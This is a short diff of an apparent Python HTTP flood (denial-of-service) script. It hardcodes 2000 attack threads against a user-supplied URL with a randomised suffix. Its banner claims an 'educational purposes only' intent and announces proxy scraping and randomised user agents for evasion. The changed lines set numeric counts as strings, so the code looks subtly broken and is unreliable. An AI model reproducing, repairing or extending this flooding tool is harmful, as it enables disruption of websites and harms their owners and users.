@@ -18,8 +18,8 @@ def attack():
 if __name__ == "__main__":
     print("Proxy scraper + randomised useragents coming soon! :tm:\nMade for educational purposes only | nasus#5311\n")
     url = input("\nURL: ")
-    num_threads = int(input("threads: "))
-    num_requests = int(input("requests per thread: "))
+    num_threads = '2000'
+    num_requests = '1'
     url = url + str(random.randint(0, 100))
     
     all_threads = []
